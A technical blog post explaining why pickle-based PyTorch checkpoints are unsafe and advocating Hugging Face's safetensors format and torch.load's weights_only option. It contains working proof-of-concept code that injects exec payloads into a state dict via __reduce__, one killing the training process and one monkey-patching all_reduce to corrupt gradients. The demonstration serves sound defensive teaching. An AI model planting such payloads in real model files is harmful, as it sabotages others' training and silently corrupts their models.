---
title: "Why do we need Hugging Face's SafeTensor?"
description: "Malicious code can be injected in your model weights and safetensors is all you need."
date: "2024-10-19"
slug: "2024-10-19-safetensor"
ogImage:
  url: "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/safetensors/safetensors-logo-light.svg"
---

A long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face's documentation - what does Hugging Face's Safetensor do? The term "Safetensor" appears in many places in the Hugging Face's documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team's model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.

## What's wrong with the current model storage?

When we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:

```python
# save model weights
state_dict = model.state_dict()
torch.save(state_dict, "model.pt")

# load model weights
state_dict = torch.load("model.pt")
model.load_state_dict(state_dict)
```

However, this method uses `pickle` to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that `pickle` is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its `__reduce__` method to execute arbitrary code.

```python
class Obj:

    def __reduce__(self):
        return (exec, ("print('hello')",))
```

If you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a "hello" statement printed when you load the object.

With this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor).

### Scenario 1: Automatically shut down the training process

As we can see in the "hello" example above, the malicious code is written as a code string. Similarly, we can prepare the following code string to create a new thread, which kills the parent process after 5 seconds. This thread works at the background so the user won't notice anything and `os.kill` does not return any error trace, which makes it hard to detect the malicious code.

```python
AUTO_SHUTDOWN = """
import os
import threading
from functools import partial

# get the process ID
pid = os.getpid()

def inject_code(pid: int):
    import time
    import os
    time.sleep(5)
    os.kill(pid, 9)

wrapped_fn = partial(inject_code, pid)
injection_thread = threading.Thread(target=wrapped_fn)
injection_thread.start()
"""
```

Next, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.

```python
def inject_malicious_code(obj, code_str):
    # bind a reduce fn to weights
    def reduce(self):
        return (exec, (code_str, ))

    # bind the reduce fn to the weights's __reduce__ method
    bound_reduce = reduce.__get__(obj, obj.__class__)
    setattr(obj, "__reduce__", bound_reduce)
    return obj

state_dict = inject_malicious_code(state_dict, AUTO_SHUTDOWN)
```

### Scenario 2: Introduce errors in collective communication

Similarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code string to hijack the `all_reduce` function. This code string monkey patches the `all_reduce` API in the `torch.distributed` module and adds 1 to the tensor in place. As a result, the all-reduce results will be larger than the expected results.

```python
HIJACK_ALL_REDUCE = """
import torch.distributed as dist

dist._origin_all_reduce = dist.all_reduce
def hijacked_all_reduce(tensor, *args, **kwargs):
    import torch.distributed as dist
    tensor = tensor.add_(1)
    return dist._origin_all_reduce(tensor, *args, **kwargs)

setattr(dist, "all_reduce", hijacked_all_reduce)
"""
```

For example, if you have 2 processes and each process is holidng a tensor `[0, 1, 2, 3]`, the all-reduce operation will sum up the tensors from each process and the result will be `[0, 2, 4, 6]`. However, if the attacker injects the malicious code, the result will be `[2, 4, 6, 8]`.

## How do Safetensors solve the problem?

In the first place, Safetensors do not use `pickle` to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors are still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face's Safetensors ensure that your model weights files only contain the parameter data and nothing else.

We have also provided some examples of using safetensors to remove the security concerns in the my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor). For every example which demonstrates the malicious scenario, you just simply add the `--use-safetensor` flag to the command to see the difference.

Moreover, if you still want to stick to `torch.load`, you can specify the argument `weights_only` so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.

## References

- https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/
- https://huggingface.co/docs/safetensors/en/index
